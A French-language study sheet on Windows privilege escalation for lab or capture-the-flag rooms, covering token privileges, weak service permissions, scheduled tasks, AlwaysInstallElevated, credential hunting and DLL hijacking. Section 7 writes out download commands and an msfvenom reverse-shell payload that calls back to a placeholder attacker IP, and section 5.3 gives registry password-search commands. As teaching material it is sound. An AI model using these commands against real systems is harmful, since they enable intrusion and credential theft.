---
technique: "Théorie — Windows Privilege Escalation"
os: Windows
categorie: Référence
tags: [theorie, privesc, windows, reference]
---

> HOME · À lire **avant** une room Windows privesc (type *Windows Jump*)
>
> Fiche pratique associée : 00-Methodologie-Windows-PrivEsc

# Théorie — Windows Privilege Escalation

But : partir d'un compte **non privilégié** et grimper jusqu'à **Administrator** ou **NT AUTHORITY\SYSTEM**. Comme en Linux, on cherche **une action privilégiée qui dépend d'un élément que je contrôle** (un exe, un dossier, une config, un privilège, un credential).

---

## 1. Les comptes Windows

| Compte | Niveau |
|--------|--------|
| **Standard User** (groupe `Users`) | accès limité, ses fichiers seulement |
| **Administrators** | contrôle total de la config système |
| **SYSTEM / LocalSystem** | **le plus haut** — au-dessus des admins, accès total |
| **Local Service** | compte de service à privilèges minimaux (réseau anonyme) |
| **Network Service** | idem mais s'authentifie sur le réseau avec le compte machine |
| **iis apppool\\defaultapppool** | compte créé par IIS pour les apps web |

L'objectif d'une room est souvent SYSTEM, mais on passe parfois par d'autres comptes non-admin d'abord (comme le `recon -> dev -> ...` en Linux).

---

## 2. Les jetons d'accès (access tokens) et les privilèges

Chaque process tourne avec un **jeton** qui porte l'identité de l'utilisateur **et une liste de privilèges**. Certains privilèges sont des portes vers SYSTEM. On les liste avec :
```cmd
whoami /priv
```

| Privilège | Ce qu'il permet | Exploit type |
|-----------|-----------------|--------------|
| **SeImpersonatePrivilege** | usurper le jeton d'un autre user qui se connecte | **Potato** (RogueWinRM, PrintSpoofer, GodPotato, JuicyPotato) -> SYSTEM |
| **SeAssignPrimaryTokenPrivilege** | assigner un jeton primaire | idem Potato |
| **SeBackupPrivilege** | **lire** n'importe quel fichier (contourne la DACL) | dump SAM+SYSTEM -> hash admin |
| **SeRestorePrivilege** | **écrire** n'importe quel fichier | remplacer un binaire / service |
| **SeTakeOwnershipPrivilege** | devenir propriétaire d'un fichier | prendre un exe SYSTEM (ex. `utilman.exe`) |
| **SeDebugPrivilege** | déboguer tout process | injecter dans un process SYSTEM / dump lsass |
| **SeLoadDriverPrivilege** | charger un driver | driver vulnérable -> SYSTEM |
| **SeManageVolumePrivilege** | accès bas niveau au volume | écriture arbitraire |

> **Règle d'or :** le premier réflexe sur un shell Windows = `whoami /priv`. Un privilège en `Enabled` dans ce tableau = vecteur quasi direct.

---

## 3. Les services Windows (le gros morceau)

Le **SCM** (Service Control Manager) lance l'exécutable d'un service (`BINARY_PATH_NAME`) sous un compte (`SERVICE_START_NAME`) à chaque démarrage. Trois failles classiques (toutes dans ton vault) :

### 3.1 Permissions faibles sur l'exécutable -> Service-Insecure-Permissions
L'exe du service est modifiable par `Users`/`Everyone` (droit **M**). Je le remplace par mon payload. Au redémarrage, il tourne avec le compte du service.

### 3.2 Chemin non entre guillemets -> Unquoted-Service-Path
`BINARY_PATH_NAME` avec des espaces et sans guillemets : le SCM teste plusieurs chemins. Si un dossier intermédiaire est inscriptible, j'y dépose un exe prioritaire.

### 3.3 DACL du service faible -> Weak-Service-DACL
La DACL du **service** me laisse le reconfigurer (`SERVICE_ALL_ACCESS`). Je change `binPath` + `obj= LocalSystem` -> SYSTEM.

> Config d'un service : `sc qc <service>`. DACL : `accesschk64.exe -qlc <service>`. Permissions d'un exe : `icacls <exe>`.

---

## 4. Abus de privilèges spécifiques (fiches dédiées)
- **SeImpersonate** -> SeImpersonate (les Potatoes)
- **SeBackupPrivilege** -> SeBackupPrivilege (dump SAM/SYSTEM + secretsdump + pass-the-hash)
- **SeTakeOwnership** -> SeTakeOwnership (prendre un binaire SYSTEM)

---

## 5. Les autres vecteurs à connaître

### 5.1 Tâches planifiées (Scheduled Tasks)
Une tâche tourne en tant qu'un user privilégié et exécute un script/exe **que je peux modifier**. J'injecte ma charge. L'équivalent Windows du cron Linux.
```cmd
schtasks /query /fo LIST /v
```

### 5.2 AlwaysInstallElevated
Deux clés de registre à `1` : tout `.msi` s'installe en **SYSTEM**. Je génère un `.msi` malveillant avec msfvenom.
```cmd
reg query HKLM\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\Software\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

### 5.3 Credentials en clair (chasse aux mots de passe)
Des creds traînent souvent : fichiers de config, `unattend.xml`, historique PowerShell, Credential Manager, registre.
```cmd
cmdkey /list                       :: identifiants stockés -> runas /savecred
reg query HKLM /f password /t REG_SZ /s
```
Fichiers classiques : `Unattend.xml`, `sysprep.xml`, `web.config`, `*.kdbx` (KeePass).

### 5.4 Registre / autoruns inscriptibles
Un programme lancé au démarrage (`Run` keys) dont l'exe ou la clé est modifiable : persistance + privesc.

### 5.5 DLL Hijacking
Une appli privilégiée charge une DLL par nom sans chemin complet. Je place ma DLL dans un dossier prioritaire (l'équivalent Windows du PATH hijack Linux fait sur `ps`).

### 5.6 Saved creds / runas
```cmd
runas /savecred /user:admin cmd.exe
```

---

## 6. Outils d'énumération auto (à connaître)

| Outil | Rôle |
|-------|------|
| **winPEAS** | le linpeas de Windows — scanne TOUT (services, privs, creds, registre) |
| **PrivescCheck.ps1** | script PowerShell d'audit privesc |
| **PowerUp.ps1** | module PowerSploit, trouve services/DLL/registre exploitables |
| **Seatbelt** | collecte d'infos système (C#) |
| **accesschk64.exe** | Sysinternals — permissions services/fichiers/registre |

> En room, on commence souvent à la main (`whoami /priv`, `sc qc`, `icacls`) pour comprendre, puis winPEAS pour ne rien rater.

---

## 7. Shells & transfert sur Windows
```cmd
:: Télécharger un fichier sur la cible
certutil -urlcache -f http://MON_IP:8000/file.exe file.exe
powershell wget http://MON_IP:8000/file.exe -O file.exe

:: Payload service pour les failles de service
msfvenom -p windows/x64/shell_reverse_tcp LHOST=MON_IP LPORT=4444 -f exe-service -o rev.exe
```
> `sc` en PowerShell = alias de `Set-Content`. Utiliser **`sc.exe`** pour piloter les services.

---

## 8. L'état d'esprit « jump » (chaîne multi-comptes)
Comme la room Linux `jump`, une room Windows peut enchaîner plusieurs comptes. À chaque palier, re-pose les **3 questions** :
1. **Qui suis-je ?** `whoami /all` (user, groupes, privilèges)
2. **Qu'est-ce qui tourne / est planifié ?** services, tâches planifiées
3. **Qu'est-ce qui est mal configuré et que je contrôle ?** exe/dossier/DACL/registre inscriptible, privilège exploitable, credential qui traîne

Détail des commandes dans 00-Methodologie-Windows-PrivEsc.
